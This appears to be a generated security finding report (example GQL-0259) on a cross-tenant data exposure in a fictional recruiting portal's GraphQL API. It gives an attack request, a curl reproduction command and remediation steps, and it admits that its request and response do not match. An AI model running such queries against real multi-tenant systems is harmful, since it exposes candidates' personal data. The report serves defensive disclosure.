# Security Analysis Report
**System:** JobCore Candidate Portal
**Domain:** HR Tech / Recruiting
**Example ID:** GQL-0259
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | HIGH | Misconfiguration — Pattern 6.1 | Schema/relationship over-exposure via `listCandidates` — caller-supplied `tenantId` exposes candidate records across tenants |

---

## Finding 1 — Misconfiguration: Schema Over-Exposure via Caller-Supplied tenantId (Pattern 6.1)

### Summary
The `listCandidates` GraphQL query on JobCore Candidate Portal (`api.jobcore-candidate-po.example.com`) accepts a caller-supplied `tenantId` argument. Per §5.0 Pattern 6.1, the schema over-exposes the relationship between tenants and candidates by treating `tenantId` as a client-controlled filter rather than a server-enforced scope derived from the JWT. An attacker authenticated to `tenant-0659` supplies `tenantId: "tenant-c4bb"` and enumerates victim candidates. The `getCandidate` resolver also lacks tenancy checks (§4.0 RISK-GQL-259).

**HAR artifact note:** Request uses `listCandidates(tenantId: "tenant-c4bb")` but response key is `getCandidate`. This inconsistency exists in context.txt §6.0 and is documented as-is.

**Pattern:** 6.1 — Schema/relationship over-exposure (Misconfiguration)
**Affected resolver:** `listCandidates(tenantId: ID, status: String)`
**Affected endpoint:** `POST https://api.jobcore-candidate-po.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://api.jobcore-candidate-po.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
x-tenant-id: tenant-0659
Content-Type: application/json

{"query": "query VulnerableOp { listCandidates(tenantId: \"tenant-c4bb\") { candidateId ownerId data { sensitiveField } } }"}
```

**Response — Victim Candidate Data Returned**
```json
{
  "data": {
    "getCandidate": {
      "tenantId": "tenant-c4bb",
      "ownerId": "other-user-0659c4bb",
      "data": { "sensitiveField": "CONFIDENTIAL-0659c4bb", "internalNotes": "Internal data exposed" }
    }
  }
}
```
Note: `x-request-id: req-0659c4bb` is a server-assigned **response** header. Not part of the attack request.

### Steps to Reproduce
```bash
TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"
curl -s -X POST https://api.jobcore-candidate-po.example.com/graphql \
  -H "Authorization: Bearer $TOKEN" -H "x-tenant-id: tenant-0659" -H "Content-Type: application/json" \
  -d '{"query":"query VulnerableOp { listCandidates(tenantId: \"tenant-c4bb\") { candidateId ownerId data { sensitiveField } } }"}'
# Vulnerable: Returns CONFIDENTIAL-0659c4bb from tenant-c4bb
# Secure: Returns FORBIDDEN — tenantId argument ignored, JWT tenant enforced
```

### Remediation
1. Derive tenant from `$jwt.tenantId` only in all resolvers — ignore caller-supplied `tenantId`.
2. `WHERE tenant_id = $jwtTenantId` in `listCandidates` and `getCandidate`.
3. Cache key: `candidate:{tenantId}:{candidateId}`.
4. **HR note:** Candidate records contain CVs and PII. Cross-tenant exposure breaches GDPR Article 5 data minimization and purpose limitation principles.
